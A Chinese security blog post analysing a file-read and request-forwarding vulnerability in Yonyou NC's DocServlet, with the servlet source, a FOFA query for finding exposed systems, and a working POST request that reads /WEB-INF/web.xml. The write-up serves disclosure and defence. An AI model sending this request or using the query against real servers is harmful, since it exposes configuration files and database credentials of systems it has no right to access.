---
title: "用友NC DocServlet 请求转发/文件读取漏洞"
source: https://mrxn.net/jswz/yonyou-nc-DocServlet-fileread.html
asset_dir: assets/用友nc-docservlet-请求转发文件读取漏洞
---

# 用友NC DocServlet 请求转发/文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/9 08:20
- 1121浏览
- [0评论](#comment)
- 24分钟阅读

深入探索

身份验证

文件系统

SQL

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC是用公司推出的一款企业管理[软件](#)，涵盖财务、供应链、生产制造等多个业务领域，旨在帮助企业实现信息化管理。

漏洞修复方案

用友NC的`DocServlet`组件存在请求转发和[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。该Servlet在处理文档相关操作时，可能未能充分验证用户提供的文件路径或请求参数。攻击者可以通过构造特定的请求，利用该Servlet的转发功能，访问服务器上的任意文件，包括敏感的配置文件、系统文件或用户数据。此外，该漏洞也可能允许攻击者将请求转发到内部或外部的任意服务器。

该漏洞可能导致攻击者读取服务器上的敏感文件，获取系统配置信息、数据库凭证或其他关键数据，从而威胁到企业的数据安全和系统完整性。同时，请求转发功能也可能被滥用，用于探测内部网络或发起进一步的攻击。

# 影响版本

NC65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

直接看`DocServlet`的实现逻辑吧，代码就几行，很简单

物流软件安全

```
package nc.uap.lfw.file.action;

import java.io.IOException;
import javax.servlet.RequestDispatcher;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.commons.lang.StringUtils;

public class DocServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String url = req.getParameter("disp");
        if (!StringUtils.isEmpty(url)) {
            if (url.toLowerCase().startsWith("/portal")) {
                url = url.substring(7);
            }

            if (!StringUtils.isEmpty(url)) {
                if (!url.toLowerCase().startsWith("/docctr/open/office")) {
                    byte[] byte1 = url.getBytes("ISO-8859-1");
                    url = new String(byte1, "UTF-8");
                    RequestDispatcher dispatcher = req.getSession().getServletContext().getRequestDispatcher(url);
                    dispatcher.forward(req, resp);
                }
            }
        }
    }

    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        this.doGet(req, resp);
    }
}
```

深入探索

服务器安全服务

云安全解决方案

安全研究工具

这个 `DocServlet` 的 Java Servlet，其核心功能是接收来自客户端的 `disp` HTTP 参数，并将其作为内部路径，使用 `RequestDispatcher` 将请求转发到服务器上的其他资源。

漏洞修复方案

由于代码在处理用户传入的 `disp` 参数时，仅进行了一次简单的、可被轻易绕过的黑名单前缀检查（`!url.toLowerCase().startsWith("/docctr/open/office")`），而完全没有对目录遍历字符（如 `../`）进行过滤或规范化处理，最终导致攻击者可以构造恶意路径。这造成了一个严重的**[任意文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)/请求转发漏洞**。攻击者可利用此漏洞读取 Web 应用目录下的任意敏感文件（如 `WEB-INF/web.xml` 配置文件、数据库凭证文件、Java 类文件等），或将请求转发到应用内部未授权的 Servlet，从而执行越权操作。

# 漏洞复现

> 可以根据包名和方法名直接搜在哪一个modules模块下面，参考[【一日一技】快速从一堆jar包找到包含特定包名的jar](https://mrxn.net/jswz/find-class-in-multiple-jars.html)

```
POST /service/~webrt/nc.uap.lfw.file.action.DocServlet HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-www-form-urlencoded

pageId=login&disp=/WEB-INF/web.xml
```

[![用友NC DocServlet 请求转发/文件读取漏洞](images/img-001-ccb59b346d3e.webp)](https://image.mrxn.net/765d53182ebc4dbfb7a57dccedcda572.webp)

找方法所在到jar包的模块位置`modules/webrt/lib/pubwebrt_fmgrLevel-1.jar`后，直接访问即可

网络安全

[![用友NC DocServlet 请求转发/文件读取漏洞](images/img-002-696f35b06d0f.webp)](https://image.mrxn.net/30f4cb35b4b04732afa1e7174b09632f.webp)

成功读取到**/WEB-INF/web.xml** 文件内容

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
